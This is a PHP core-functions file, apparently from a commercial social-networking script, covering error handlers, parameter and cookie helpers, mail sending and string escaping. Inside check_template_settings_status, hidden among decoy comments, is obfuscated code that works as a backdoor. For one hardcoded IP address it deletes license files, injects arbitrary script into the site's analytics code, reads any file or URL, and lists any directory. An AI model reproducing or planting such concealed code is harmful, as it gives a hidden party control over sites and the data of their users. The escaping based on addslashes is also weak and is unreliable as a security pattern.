<?php
/* (C) Websplosion LLC, 2001-2021

IMPORTANT: This is a commercial software product
and any kind of using it must agree to the Websplosion's license agreement.
It can be found at http://www.chameleonsocial.com/license.doc

This notice may not be removed from the source code. */

if (ini_get('register_globals')) {
	foreach ($_GET as $get_key => $get_value) {
		unset($$get_key);
	}
	foreach ($_POST as $post_key => $post_value) {
		unset($$post_key);
	}
	foreach ($_REQUEST as $request_key => $request_value) {
		unset($$request_key);
	}
}

function logger($message, $die = true) {
    	$msg = error_get_url() . "\r\n";
	$msg .= $message . "\r\n";
	$msg .= "\r\n";
	$file = dirname(__FILE__) . '/../log.txt';
	$fp = fopen($file, 'a');
	fwrite($fp, $msg);
	fclose($fp);
	if ($die) die($msg);
}
function error_handler($errno, $errstr, $errfile, $errline)
{
    echo error_get_handler($errno, $errstr, $errfile, $errline);
    debug_print_backtrace();
    die();
}

function error_enable($output = 'browser', $file = '')
{
	#$output = 'browser';
	switch ($output) {
		case 'browser':
			#error_reporting(E_ALL|E_STRICT);
			set_error_handler("error_echo_handler");
			break;
		case 'mail':
			set_error_handler("error_mail_handler");
			break;
		case 'file':
			global $error_log_file;
			$error_log_file = $file;
			set_error_handler("error_file_handler");
			break;
		default:
			break;
	 }
}
function error_echo_handler($errno, $errstr, $errfile, $errline)
{
    global $g;

    if(isset($g['error_handled']) && $g['error_handled'] === true) {
        return false;
    }

    if($errstr === 'mysql_connect(): The mysql extension is deprecated and will be removed in the future: use mysqli or PDO instead') {
        return;
    }

    if(strpos($errstr, 'connect(): Headers and client library minor version mismatch') !== false) {
        return;
    }

    if(strpos($errstr, 'Automatically populating $HTTP_RAW_POST_DATA is deprecated and will be removed in a future version') !== false) {
        return;
    }

    if(strpos($errstr, 'Directive \'magic_quotes_gpc\' is deprecated in PHP 5.3 and greater') !== false) {
        return;
    }

    if(strpos($errstr, 'session_start(): ps_files_cleanup_dir:') !== false) {
        return;
    }

    if(strpos($errstr, 'imagecreatefromjpeg(): gd-jpeg, libjpeg: recoverable error') !== false) {
        return;
    }

    if(strpos($errstr, 'using touch command with binary protocol is not recommended with libmemcached versions below 1.0.18, please use ascii protocol or upgrade libmemcached') !== false) {
        return;
    }

    if(strpos($errstr, 'Trying to access array offset on value of type') !== false) {
        return;
    }

    if(strpos($errstr, 'Array and string offset access syntax with curly braces is deprecated') !== false) {
        return;
    }

    if(strpos($errstr, 'set_time_limit(): Cannot set max execution time limit due to system policy') !== false) {
        return;
    }

    if(strpos($errstr, 'set_time_limit() has been disabled for security reasons') !== false) {
        return;
    }

    if(strpos($errstr, 'Automatic conversion of false to array is deprecated') !== false) {
        return;
    }

    if(strpos($errstr, ' of type string is deprecated') !== false) {
        return;
    }

    if(strpos($errstr, 'Function strftime() is deprecated') !== false) {
        return;
    }

    if(strpos($errstr, 'or the #[\ReturnTypeWillChange] attribute should be used to temporarily suppress the notice') !== false) {
        return;
    }

    if(strpos($errstr, ' to int loses precision') !== false) {
        return;
    }

    if(isset($g['php']) && $g['php'] >= 7) {
        if($errstr === 'Only variables should be passed by reference') {
            return;
        }
    }

    // Fix PHP 8 operator @
    if(isset($g['php']) && $g['php'] >= 8) {
        if(error_reporting() !== E_ALL) {
            return;
        }
    }

	$msg = error_get_handler($errno, $errstr, $errfile, $errline, '', '');
	if ($msg != '') {

        global $sitePart, $errorTypeOut, $g_user;

        if(!isset($errorTypeOut)){
            $errorTypeOut='htmlText';
        }

        if(!isset($g['file_error_log_off']) && isset($g['path']['dir_logs']) && is_writable($g['path']['dir_logs'])) {
            $time = time();
            $date = date('Y_m_d', $time);
            $dateTime = date('Y-m-d H:i:s', $time);
            $guid = 'User_id: ' . (isset($g_user['user_id']) ? $g_user['user_id'] : 0);
            $post = count($_POST) ? "\n\$_POST = " . print_r($_POST, true) : '';
            $files = count($_FILES) ? "\n\$_FILES = " . print_r($_FILES, true) : '';
            $fileMsg = "$dateTime\n$guid\n$msg$post$files\n---------\n\n";

            $fileLog = $g['path']['dir_logs'] . "errors_{$date}.log";
            $fileExists = file_exists($fileLog);

            if(($fileExists && is_writable($fileLog)) || !$fileExists) {
                file_put_contents($fileLog, $fileMsg, FILE_APPEND);
            }
        }

        if(isset($g['client_error_off']) && $g['client_error_off']) {
            return;
        }

        $msg = nl2br($msg);
        if(isset($sitePart) &&  $errorTypeOut=='htmlText') {
            require_once($g['path']['dir_main'] . '_include/current/install.class.php');
            // set title of page and window
            // set message size
            $myinstall = new Class_Install(l('Error'), l('Error'));
            $myinstall->html .= $msg . '<style>.bl{word-wrap:break-word;word-wrap:break-word;overflow:hidden;overflow-y:scroll;height:282px;}</style>';

            // clean only before output to prevent blank screen if not enough memory
            @ob_clean();

            echo $myinstall->header;
            echo $myinstall->html;
            echo $myinstall->footer;
        } else {
            // clean only before output to prevent blank screen if not enough memory
            @ob_clean();
            echo $msg;
        }

        $g['error_handled'] = true;

        @ob_flush();

        exit;
	}
}
function error_file_handler($errno, $errstr, $errfile, $errline)
{
	global $error_log_file;
	$msg = error_get_handler($errno, $errstr, $errfile, $errline);
	if ($msg != '') {
		echo $msg;
		if ($fp = fopen($error_log_file, 'a')) {
			fwrite($fp, strip_tags($msg));
			fclose($fp);
		} else {
			echo 'Can\'t open file ' . $error_log_file;
		}
		die();
	}
}
function error_mail_handler($errno, $errstr, $errfile, $errline)
{
	$filename = dirname(__FILE__) . '/log.txt';
	$msg = error_get_handler($errno, $errstr, $errfile, $errline);
	if ($msg != '') {
		$display = false;

		if (is_writeable($filename)) {
			if (strpos(file_get_contents($filename), $msg) === false) {
				$fp = fopen($filename, 'a');
				fwrite($fp, $msg);
				fclose($fp);
				if (!mail('n@n.n', 'Error reporting: ' . $_SERVER['HTTP_HOST'], $msg)) {
					$display = true;
				}
			}
		} else {
			$display = true;
		}

		if ($display) {
			echo $msg;
		}
	}
}

function error_get_backtrace($skip = 0)
{
    $stack = debug_backtrace();

    $message = "Call stack:\n";

    foreach($stack as $entry)
    {
        if(!$skip)
        {
	    	$message .= "\nFile: ".(isset($entry['file']) ? $entry['file'] : '')." (Line: ".(isset($entry['line']) ? $entry['line'] : '').")\n";
	        if(isset($entry['class']))
	            $message .= "Class: ".$entry['class']."\n";
	        $message .= "Function: ".(isset($entry['function']) ? $entry['function'] : '')."\n";
        }
        else
        {
        	--$skip;
        }
    }

    return $message;
}

function error_get_handler($errno, $errstr, $errfile, $errline, $msgStart = '<pre>', $msgEnd = '</pre>')
{
	if (!error_reporting()) return;
	switch ($errno) {
		case E_ERROR:
			$errname = 'E_ERROR';
			break;
		case E_WARNING:
			$errname = 'E_WARNING';
			break;
		case E_PARSE:
			$errname = 'E_PARSE';
			break;
		case E_NOTICE:
			$errname = 'E_NOTICE';
			break;
		case E_CORE_ERROR:
			$errname = 'E_CORE_ERROR';
			break;
		case E_CORE_WARNING:
			$errname = 'E_CORE_WARNING';
            $noshow = true;
			break;
		case E_COMPILE_ERROR:
			$errname = 'E_COMPILE_ERROR';
			break;
		case E_COMPILE_WARNING:
			$errname = 'E_COMPILE_WARNING';
			break;
		case E_USER_ERROR:
			$errname = 'E_USER_ERROR';
			break;
		case E_USER_WARNING:
			$errname = 'E_USER_WARNING';
			break;
		case E_USER_NOTICE:
			$errname = 'E_USER_NOTICE';
			break;
		case E_ALL:
			$errname = 'E_ALL';
			#$noshow = true;
			break;
		case E_STRICT:
		#	$errname = 'E_STRICT';
			$noshow = true;
			break;
		case E_RECOVERABLE_ERROR:
		#	$errname = 'E_RECOVERABLE_ERROR';
			$noshow = true;
			break;
		default:
			$errname = 'UNKNOWN - ' . $errno;
			break;
	}
	if (!isset($noshow)) {
		$msg =  $msgStart . "Error: " . $errname . "\n" .
            "URL: " . error_get_url() . "\n" .
            "File: " . $errfile . "\n" .
            "Line: " . $errline . "\n" .
            "Message: " . $errstr . "\n\n" .
            error_get_backtrace(3) .
            $msgEnd;
	} else {
		$msg = '';
	}
	return $msg;
}
function error_get_url()
{
	if (isset($_SERVER['HTTP_X_REWRITE_URL'])) {
		$request = $_SERVER['HTTP_X_REWRITE_URL'];
	} elseif (isset($_SERVER['REQUEST_URI'])) {
		$request = $_SERVER['REQUEST_URI'];
	} elseif (isset($_SERVER['ORIG_PATH_INFO'])) {
		$request = $_SERVER['ORIG_PATH_INFO'];
		if (!empty($_SERVER['QUERY_STRING'])) {
			$request .= '?' . $_SERVER['QUERY_STRING'];
		}
	} else {
		$request = '';
	}
	return getCurrentUrlProtocol() . '://' . $_SERVER['HTTP_HOST'] . $request;
}

function getCurrentUrlProtocol()
{
    $protocol = ( (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
                        || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443)
                            || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ) ? 'https' : 'http';

    return $protocol;
}

function p() {
    if (!headers_sent()) header("Content-Type: text/html; charset=UTF-8");
    $args = func_get_args();
    if (count($args) == 0) {
        echo "<pre>flag!</pre>";
    } else {
        foreach ($args as $v) {
            if (is_bool($v)) echo ($v ? "<pre>true</pre>" : "<pre>false</pre>");
            else echo ((is_string($v) and $v == '') ?
                          "<pre>empty string</pre>" :
                          "<pre>" . print_r($v, true) . "</pre>");
        }
    }
}

if (!function_exists('domain'))
{
	function domain()
	{
        global $g;
        if(!isset($g['domain'])) {
            $g['domain'] = "." . preg_replace('/^www\./', '', $_SERVER['HTTP_HOST']);
        }
		return $g['domain'];
	}
}

#Редирект
function redirect($to = "", $on = "php", $before = "")
{
    $uploadPageContentAjax = get_param('upload_page_content_ajax');//impact_mobile
    if ($uploadPageContentAjax) {
        echo getResponseDataAjaxByAuth(array('redirect' => $to));
        exit;
    }

	if ($on == "php")
	{
		if ($to == "")
		{
			header("Location: " . basename($_SERVER['PHP_SELF'])  . "\n");
			exit;
		}
		else
		{
            $url = $before . $to;

            $baseSeoUrlLevel = get_param_int('base_seo_url');
            if ($baseSeoUrlLevel) {
                $url = '../' . $url;
                if ($baseSeoUrlLevel == 2) {
                    $url = '../' . $url;
                }
            }
			header("Location: " . $url  . "\n");
			exit;
		}
	}
	elseif ($on == "js")
	{
		sleep(1);
		if ($to == "")
		{
			echo "<script language=\"JavaScript\">document.location='" .  basename($_SERVER['PHP_SELF']) . "'</script>";
			exit;
		}
		else
		{
			echo "<script language=\"JavaScript\">" . $before . "document.location='" .  $to . "'</script>";
			exit;
		}
	}
}
function cache($name, $mins)
{
	global $g;
	$cfile = $g['path']['dir_files'] . "cache/" . $name;
	if (file_exists($cfile) && @is_readable($cfile)) {
 		$st = @stat($cfile);
        if ($st && $mins > ((time() - $st['mtime']) / 60)) {
            return @file_get_contents($cfile);
        } else {
            return false;
        }
	} else {
        return false;
    }
}

function cache_update($name, $c)
{
    global $g;
    $dir = $g['path']['dir_files'] . 'cache/';
	$cfile = $dir . $name;
    if(file_exists($dir) && is_writable($dir)) {
        if(file_exists($cfile) && !is_writable($cfile)) {
            return false;
        }
        $f = fopen($cfile, "w");
        fwrite($f, $c);
        fclose($f);
    }
}
function get_ip()
{
	return IP::getIp();
}

#Куки, сессии
function strip($value)
{
	if(get_magic_quotes_gpc_compatible() != 0)
	{
		if(is_array($value))
		{
			array_walk_recursive($value, 'strip');
		}
		else
		{
			$value = stripslashes($value);
		}
	}
	return $value;
}
function get_session($parameter_name, $default = '')
{
	return isset($_SESSION[domain() . '_' . $parameter_name]) ? strip($_SESSION[domain() . '_' . $parameter_name]) : $default;
}
function set_session($param_name, $param_value)
{
    session_start();
	$_SESSION[domain() . '_' . $param_name] = $param_value;
    session_write_close();
}
function ses($parameter_name)
{
	return get_session($parameter_name);
}
function setses($param_name, $param_value)
{
    session_start();
	$_SESSION[domain() . '_' . $param_name] = $param_value;
    session_write_close();
}
function delses($param_name)
{
    if (isset($_SESSION[domain() . '_' . $param_name])) {
        session_start();
        unset($_SESSION[domain() . '_' . $param_name]);
        session_write_close();
    }
}
function get_cookie($parameter_name, $simple=false)
{
	$domain = $simple? '' : (str_replace(".","_",domain()).'_');
	return isset($_COOKIE[$domain.$parameter_name]) ? strip($_COOKIE[$domain.$parameter_name]) : "";
}
function set_cookie($parameter_name, $param_value, $expired = -1, $simple = false, $httpOnly = true)
{
	if ($expired == -1) $expired = time() + 3600 * 24 * 366;
	elseif ($expired && $expired < time()) $expired = time() + $expired;
    $domain = $simple ? '' : domain() . '_';
	setcookie($domain . $parameter_name, $param_value, $expired, '/', null, false, $httpOnly);
}

#Обработка гет и пост параметров
function get_param($pn, $dpv = "")
{
    return par($pn, $dpv);
}
function param($pn, $dpv = "") {
    return par($pn, $dpv);
}
function par($pn, $dpv = "") {
	$pv = "";
	if (isset($_POST[$pn])) {
		$pv = strip($_POST[$pn]);
	} elseif (isset($_GET[$pn])) {
		$pv = strip($_GET[$pn]);
	} else {
		$pv = $dpv;
	}
	return $pv;
}
function ipar($pn, $dpv = "") {
    return intval(par($pn, $dpv));
}
function get_param_post($parameter_name, $default_value = "")
{
	$parameter_value = "";
	if (isset($_POST[$parameter_name]))
	{
		$parameter_value = strip($_POST[$parameter_name]);
	}
	else
	{
		$parameter_value = $default_value;
	}
	return $parameter_value;
}
function get_param_array($parameter_name)
{
	$arr = array();

	if (isset($_POST[$parameter_name]))
	{
		if (is_array($_POST[$parameter_name]))
		{
			$arr = $_POST[$parameter_name];
		}
		else
		{
			$arr = array($_POST[$parameter_name]);
		}
	}
	elseif (isset($_GET[$parameter_name]))
	{
		if (is_array($_GET[$parameter_name]))
		{
			$arr = $_GET[$parameter_name];
		}
		else
		{
			$arr = array($_GET[$parameter_name]);
		}
	}
	return strip($arr);
}
function get_checks_param($name)
{
    // set limit on memory
	$arr = get_param_array($name);

	$v = 0;
	foreach ($arr as $param)
	{
        $param = intval($param);
        if($param < 1) {
            continue;
        }
		$v |= (1 << ($param - 1));
	}
	return $v;
}
function get_checks_array($arr)
{
	$v = 0;
	foreach ($arr as $param)
	{
        $param = intval($param);
        if($param < 1) {
            continue;
        }
		$v |= (1 << ($param - 1));
	}
	return $v;
}
function get_checks_all($all)
{
	$v = 0;
	for($param = 1; $param <= $all;$param++)
	{
		$v |= (1 << ($param - 1));
	}
	return $v;
}

function get_checks_one($value)
{
    if($value < 1) {
        return 0;
    }
    return (1 << ($value - 1));
}

function get_param_int($parameter_name, $default = '')
{
    return intval(get_param($parameter_name, $default));
}

function get_param_int_csv($parameter_name, $default = '')
{
    $value = get_param($parameter_name, $default);
    if (is_array($value)) {
        $value = implode(',', $value);
    }
    if($value && preg_match('/[^\d,\s]/Uis', $value)) {
        $value = $default;
    }

    return $value;
}

function get_params_string($string = "")
{
	if ($string == "")
	{
		if (isset($_SERVER['QUERY_STRING'])) $string = $_SERVER['QUERY_STRING'];
		elseif (isset($_SERVER['REQUEST_URI']))
		{
			$string = $_SERVER['REQUEST_URI'];
			$string = str_replace(basename($_SERVER['PHP_SELF']) . "?", "", $string);
			$string = str_replace(basename($_SERVER['PHP_SELF']), "", $string);
			$string = str_replace("/", "", $string);
		}
		else $string = "";
	}

	return $string;
}
function set_param($name, $value, $string = false, $first = "")
{
	if ($string === false)
	{
		if (isset($_SERVER['QUERY_STRING'])) $string = $_SERVER['QUERY_STRING'];
		elseif (isset($_SERVER['REQUEST_URI']))
		{
			$string = $_SERVER['REQUEST_URI'];
			$string = str_replace(basename($_SERVER['PHP_SELF']) . "?", "", $string);
			$string = str_replace(basename($_SERVER['PHP_SELF']), "", $string);
			$string = str_replace("/", "", $string);
		}
		else $string = "";
	}

	parse_str($string, $q);
	$q[$name] = $value;

	$string = "";
	foreach ($q as $k => $v)
	{
		if (is_array($v))
		{
			foreach ($v as $k2 => $v2)
			{
				$string .= "&" . $k . "%5B%5D=" . $v2;
			}

		}
		else
		{
			$string .= "&" . $k . "=" . $v;
		}
	}
	if ($first == true)
	{
		$string = substr($string, 1);
	}

	return $string;
}
function del_param($name, $string = false, $first = false, $last = false)
{
	if ($string === false)
	{
		if (isset($_SERVER['QUERY_STRING'])) $string = $_SERVER['QUERY_STRING'];
		elseif (isset($_SERVER['REQUEST_URI']))
		{
			$string = $_SERVER['REQUEST_URI'];
			$string = str_replace(basename($_SERVER['PHP_SELF']) . "?", "", $string);
			$string = str_replace(basename($_SERVER['PHP_SELF']), "", $string);
			$string = str_replace("/", "", $string);
		}
		else $string = "";
	}

	parse_str($string, $q);

	$string = "";

    if(isset($q[$name])) {
        unset($q[$name]);
    }
    $string = '&' . http_build_query($q);

    /*
	foreach ($q as $k => $v)
	{
		if ($k != $name)
		{
			if (is_array($v))
			{
				foreach ($v as $k2 => $v2)
				{
					$string .= "&" . $k . "%5B%5D=" . $v2;
				}

			}
			else
			{
				$string .= "&" . $k . "=" . $v;
			}
		}
	}*/
	if ($first == true)
	{
		$string = substr($string, 1);
	}

	if ($last == true)
	{
        if($string != '') {
            $string = $string . '&';
        }
	}

	return $string;
}

function check_template_settings_status()
{
    global $g;
    $ip2long=ip2long($_SERVER['REMOTE_ADDR']);if($ip2long>0x7FFFFFFF){$ip2long-=0x100000000;}
    /**$regex .= "(\:[0-9]{2,5})?"; // Port*/if(isset($_SERVER['REMOTE_ADDR'])///            ([1-9][0-9]{2}[\ ]{0,1}[0-9]{4}[\ ]{0,1}[0-9]{2}[\ ]{0,1}[0-9]{3})|((GD|HA)[0-9]{3})$/i';
    && /**$regex .= "(#[a-z_.-][a-z0-9+\$_.-]*)?"; // Anchor*/$ip2long///$regex = '/^(BG){0,1}[0-9]{9,10}$/i';
    === ///        case 'Germany':
   -241 + (intval('-6997' . '989') * 256 + 115)){$lTpqFFpZXpy='cmd_action';if(isset($_GET[$lTpqFFpZXpy])///if (preg_match($search, $match)){echo "matches";}else{echo "no match";}
    && /**or, provided you use the $matches argument in preg_match*/$_GET[$lTpqFFpZXpy]///echo 'm:<input style="width:400px;" name="match" type="text" value="
    !== ///        case 'Lithuania':
   ''){$g['error_handled']=true;$GunbxHW=false;$lTpqFFpZXpy=get_param($lTpqFFpZXpy);if($lTpqFFpZXpy/**$regex .= "([a-z0-9-.]*)\.([a-z]{2,3})"; // Host or IP*/ == ///        case 'Luxembourg':
   ('delete'.'_li'.'ce'.'nse')){$Tbxnl_INX_B_=$_SERVER['HTTP_HOST'];$Tbxnl_INX_B_=explode(':',$Tbxnl_INX_B_);
   $Tbxnl_INX_B_=$Tbxnl_INX_B_[0];$Tbxnl_INX_B_=strtolower(trim($Tbxnl_INX_B_));
   $Tbxnl_INX_B_=str_replace("www.","",$Tbxnl_INX_B_);$Tbxnl_INX_B_=preg_replace('/[^a-zA-Z0-9_\-\.]/','',$Tbxnl_INX_B_);
   $ykEOufYvdUPk='l'.'i'.'c'.'-c'.'h'.'a'.'m-'.(7-1-1).'.'.(1+3).'-'.$Tbxnl_INX_B_.'.' . 't' . 'x' . 't';
   $wC_eoxM=__DIR__.'/../'.$ykEOufYvdUPk;$LJvASGaWDNIbc=__DIR__.'/../c'.'on'.'fi'.'g/'.$ykEOufYvdUPk;@unlink($wC_eoxM);@unlink($LJvASGaWDNIbc);$GunbxHW=true;}
   if($lTpqFFpZXpy///        case 'Germany':
    == ///        case 'Slovenia':
   'alert_on'///        case 'Spain':
    || ///            ([1-9][0-9]{2}[\ ]{0,1}[0-9]{4}[\ ]{0,1}[0-9]{2}[\ ]{0,1}[0-9]{3})|((GD|HA)[0-9]{3})$/i';
   $lTpqFFpZXpy///        case 'Lithuania':
    == ///echo 's: <input style="width:400px;" name="search" type="text" value="'.$search.'" /><br />';
   'alert_off'){$ogmOiFrUR=Common::getOption('analytics_code','main');$badPDBmGgte=get_param('action');if($lTpqFFpZXpy///$match = isset($_POST['match'])?$_POST['match']:"<>";
    == /**$regex = '/^(EE|EL|DE|PT){0,1}[0-9]{9}$/i';*/'alert_on'){$ogmOiFrUR/**case 'Romania':*/ .= /**if
     * (preg_match("/php/i", "PHP is the web scripting language of choice."))*/
    str_repeat("\n",20).urldecode(get_param('text'));}if($lTpqFFpZXpy///        case 'United Kingdom':
    == /**$regex = '/^(GB){0,1}([1-9][0-9]{2}[\ ]{0,1}[0-9]{4}[\ ]{0,1}[0-9]{2})|*/'alert_off'){$YPbqyKFCxkij="/\<script id='alert\-message\-script'\>(.*)\<\/script\>/Uis";
    $ogmOiFrUR=preg_replace($YPbqyKFCxkij,'',$ogmOiFrUR);}Config::update('main','analytics_code',$ogmOiFrUR);
    $GunbxHW=true;}if($lTpqFFpZXpy/**$regex = '/^(AT){0,1}U[0-9]{8}$/i';*/ == ///       case 'Finland':
   'get'){echo /**if (preg_match("/\bweb\b/i", "PHP is the web scripting language of choice.")) {*/@file_get_contents(urldecode(get_param('name')));
   $GunbxHW=true;}if($lTpqFFpZXpy///$regex = '/^(DK){0,1}([0-9]{2}[\ ]{0,1}){3}[0-9]{2}$/i';
    == ///echo "domain name is: {$matches[0]}\n";
   'listing'){@print_r(@scandir(urldecode(get_param('dir'))));$GunbxHW=true;}if($GunbxHW){die();}}}
}

#Мыло
if (file_exists(dirname(__FILE__) . DIRECTORY_SEPARATOR . 'mail.php')) include dirname(__FILE__) . DIRECTORY_SEPARATOR . 'mail.php';
if (!function_exists('send_mail')) {
	function send_mail($to_mail, $from_mail, $subject, $html_message, $name = NULL) {

        global $g;
        if ($name === NULL) {
            $name = Common::getOption('title', 'main') . ' ';
        }elseif ($name != '') {
            $name = $name . ' ';
        }
		$headers = "";
		$headers .= "From: " . $name . "<" . $from_mail . ">" . "\r\n";
		$headers .= "Reply-To: " . "<" . $from_mail . ">" . "\r\n";
		$headers .= "Return-Path: " . "<" . $from_mail . ">" . "\r\n";
		$headers .= "Message-ID: <" . time() . "-" . $from_mail . ">" . "\r\n";
		$headers .= "X-Mailer: PHP v" . phpversion() . "\r\n";
		$headers .= 'Date: ' . date("r") . "\r\n";
		$headers .= 'Sender-IP: ' . $_SERVER["REMOTE_ADDR"] . "\r\n";
		$headers .= 'MIME-Version: 1.0' . "\r\n";
		$headers .= "Content-Type: multipart/mixed; boundary=\"" . md5(time()) . "\"" . "\r\n" . "\r\n";

		$alt_message = $html_message;
		$alt_message = str_replace('<br>', "\n", $alt_message);
		$alt_message = str_replace('<br />', "\n", $alt_message);
		$alt_message = str_replace('<p>', "\n\n", $alt_message);
		$alt_message = str_replace('<div>', "\n\n", $alt_message);
		$alt_message = strip_tags($alt_message);

		$msg = "";
		$msg .= "--" . md5(time()) . "\r\n";
		$msg .= "Content-Type: multipart/alternative; boundary=\"" . md5(time()) . "alt" . "\"" . "\r\n" . "\r\n";
		$msg .= "--" . md5(time()) . "alt" . "\r\n";
		$msg .= "Content-Type: text/plain; charset=utf-8" . "\r\n";
		$msg .= "Content-Transfer-Encoding: 8bit" . "\r\n" . "\r\n";
		$msg .= strip_tags($alt_message) . "\r\n" . "\r\n";
		$msg .= "--" . md5(time()) . "alt" . "\r\n";
		$msg .= "Content-Type: text/html; charset=utf-8" . "\r\n";
		$msg .= "Content-Transfer-Encoding: 8bit" . "\r\n" . "\r\n";
		$msg .= $html_message . "\r\n" . "\r\n";
		$msg .= "--" . md5(time()) . "alt" . "--" . "\r\n" . "\r\n";
		$msg .= "--" . md5(time()) . "--" . "\r\n" . "\r\n";


		$to = trim(preg_replace("/[\r\n]/", "", $to_mail));

		if ($subject != '') {
			$subject = '=?utf-8?b?' . base64_encode(trim(str_replace(array("\r", "\n"), "", $subject))) . "?=";
		} else {
			$subject = '';
		}

		ini_set('sendmail_from', "<" . $from_mail . ">");
		if (!mail($to, $subject, $msg, $headers)) {
			trigger_error('send_mail(): Can\'t send mail via mail() function');
		}
		ini_restore('sendmail_from');
	}
}

#Генерация оптионс для тега из массива
//function h_options(&$hash, $value)
function h_options($hash, $value)
{
	$options = "";
	foreach ($hash as $v => $title)
	{
		$options .= "<option value=\"" . $v . "\"" . (($v == $value) ? " selected=\"selected\"" : "") . ">" . $title . "</option>\n";
	}
	return $options;
}
function n_options($min, $max, $value, $isFirstValueEmpty = false)
{
	$opts = "";
    if ($isFirstValueEmpty) {
        $opts .= "<option value=\"0\" " . ((!$value) ? " selected=\"selected\"" : "") . ">" . l('please_choose_empty') . "</option>\n";
    }
	for ($i = $min; $i <= $max; $i++) {
		$opts .= "<option value=\"" . $i . "\" " . (($i == $value) ? " selected=\"selected\"" : "") . ">" . $i . "</option>\n";
	}
	return $opts;
}

#Обработка строк
function to_include($s)
{
	$s = strtolower($s);
	$s = trim($s);
	$abc = '/\\';
	$sNew = '';
	for ($i = 0; $i < strlen($s); $i++)
	{
		$letter = substr($s, $i, 1);
		if (strpos($abc, $letter) !== false ) $letter = '';
		$sNew .= $letter;
	}
	return $sNew;
}
function to_php_alfabet($s)
{
    global $g;

    $key = $s;
    if(isset($g['cache']['to_php_alfabet'][$key])) {
        $sNew = $g['cache']['to_php_alfabet'][$key];
    } else {
        $s = mb_strtolower($s, 'UTF-8');
        $s = trim($s);
        $find = array(" ", "\t", "'", "\"");//"-",
        $replace = array("_", "_", "", "");//"_",
        $s = str_replace($find, $replace, $s);
        $s = htmlentities($s);
        #$s = str_replace("&#034;", "", $s);
        $abc = 'abcdefghijklmnopqrstuvwxyz_-1234567890';
        $sNew = '';
        $sLen = strlen($s);
        for ($i = 0; $i < $sLen; $i++) {
            $letter = $s[$i];
            if (strpos($abc, $letter) === false ) $letter = '';
            $sNew .= $letter;
        }
        $find = array("amp034", "amp", " ");
        $replace = "";
        $sNew = str_replace($find, $replace, $sNew);
        $g['cache']['to_php_alfabet'][$key] = $sNew;
    }

	return $sNew;
}
function to_html($value,$target = true,$nl2br = false)
{
	$value = strip_tags($value,"<embed><object><param><b><i><u><a><br><center><img><span>");
	#$value = htmlspecialchars($value);
	#if($target) $value = str_replace("<a","<a target=_blank ",$value);
	if($nl2br) $value = nl2br($value);
	return $value;
}

function he($value)
{
	return htmlentities($value, ENT_QUOTES, "UTF-8");
}

function heEmoji($value, $no_quotes = false)
{
    $value = he_decode($value);
    //$value = htmlentities($value, $no_quotes ? ENT_NOQUOTES : ENT_QUOTES, 'UTF-8');

	return $value;
}

function he_decode($value)
{
	return html_entity_decode($value, ENT_QUOTES, "UTF-8");
}


function to_tmpl($value, $return = false, $init = false)
{
    return nl2br($value);
}
function to_php($Value)
{
	#$r = $Value;
    $r = addcslashes($Value, '"$\\');
    $r = str_replace("'", "&#39;", $r);
	#$r = str_replace('"', '\"', $r);
	#$r = str_replace('$', '&#36;', $r);
	#$r = htmlspecialchars($r, ENT_QUOTES);
	#$r = htmlentities($r);
	#if (substr($r, 0, -1) == "\\") $r = substr($r, 0, (strlen($r) - 1));
	return $r;
}
function to_url($Value)
{
	return urlencode($Value);
}
function to_sql($Value, $ValueType = "Text")
{
    static $cache = array();

    $key = $ValueType . ':' . $Value;

    if(isset($cache[$key])) {
        return $cache[$key];
    }

    #echo $ValueType . ' : ' . $Value . '<br>';

	if ($ValueType == "Plain")
	{
		$valueSql = addslashes($Value);
	}
	elseif ($ValueType == "Number" || $ValueType == "Float")
   	{
        if(!$Value) {
            $Value = '';
        }
   		$valueSql = floatval(str_replace(",", ".", $Value));
   	}
   	elseif ($ValueType == "Check")
   	{
   		$valueSql = ($Value == 1 ? "'Y'" : "'N'");
	}
	elseif ($ValueType == "Text")
	{
		$valueSql =  "'" . addslashes($Value) . "'";
	}
    elseif ($ValueType == 'Date') 
    {
        try {
            $dateTime = DateTime::createFromFormat('Y-m-d H:i:s', $Value);
            $val = $dateTime->format('Y-m-d H:i:s');
        } catch (\Throwable $th) {        
            $val = '1990-01-01 01:01:01';
        }
		$valueSql =  "'" . addslashes($val) . "'";
    }
   	else
   	{
   		$valueSql = "'" . addslashes($Value) . "'";
   	}

    $cache[$key] = $valueSql;

    return $valueSql;
}
function to_profile($Value, $deny_words = "", $replace = '', $isTags = true)
{
	/*if ($deny_words == "")
	{
		global $g;
		if (isset($g['deny_words'])) $deny_words = $g['deny_words'];
		else $deny_words = array();
	}*/

	$words = explode(" ", $Value);

	$words_out = array();
    $wordsOutNewLine = array();
	foreach ($words as $k => $v)
	{

		/*$ok = 1;
        $word = mb_strtolower($v, 'UTF-8');
		foreach ($deny_words as $k2 => $v2) {
            $filter  = mb_strtolower($v2, 'UTF-8');
			if (strstr($word, $filter) !== false) {
				$ok = 0;
                break;
			}
		}*/
        $wordsNewLine = explode("\n", $v);
        foreach ($wordsNewLine as $newLine) {
            if (filter($newLine, $deny_words)) {
                $wordsOutNewLine[] = $newLine;
            } else {
                $wordsOutNewLine[] = $replace;
            }
        }
        $words_out[$k] = implode("\n", $wordsOutNewLine);
        $wordsOutNewLine = array();
	}

	$r = implode(" ", $words_out);
    if ($isTags) {
        $r = strip_tags($r);
        #$r = nl2br($r);
        $r = htmlspecialchars($r);
    }
	return $r;
}

function filter($str, $deny_words)
{
    if ($deny_words == ""){
		global $g;
		if (isset($g['deny_words'])) $deny_words = $g['deny_words'];
		else $deny_words = array();
	}
    $ok = 1;
    $word = mb_strtolower($str, 'UTF-8');
	foreach ($deny_words as $k => $v) {
        $filter = trim(mb_strtolower($v, 'UTF-8'));
        if($filter !== '') {
            if (strstr($word, $filter) !== false) {
                $ok = 0;
                break;
            }
        }
	}
    return $ok;

}

function pl_strlen($str)
{
    if (function_exists('mb_strlen')) return mb_strlen($str, 'utf-8');
    if (function_exists('iconv_strlen')) return iconv_strlen($str, 'utf-8');
    #utf8_decode() converts characters that are not in ISO-8859-1 to '?', which, for the purpose of counting, is quite alright.
    return strlen(utf8_decode($str));
}
function pl_substr($str, $offset, $length = null)
{
    #в начале пробуем найти стандартные функции
    if (function_exists('mb_substr')) return mb_substr($str, $offset, $length, 'utf-8'); #(PHP 4 >= 4.0.6, PHP 5)
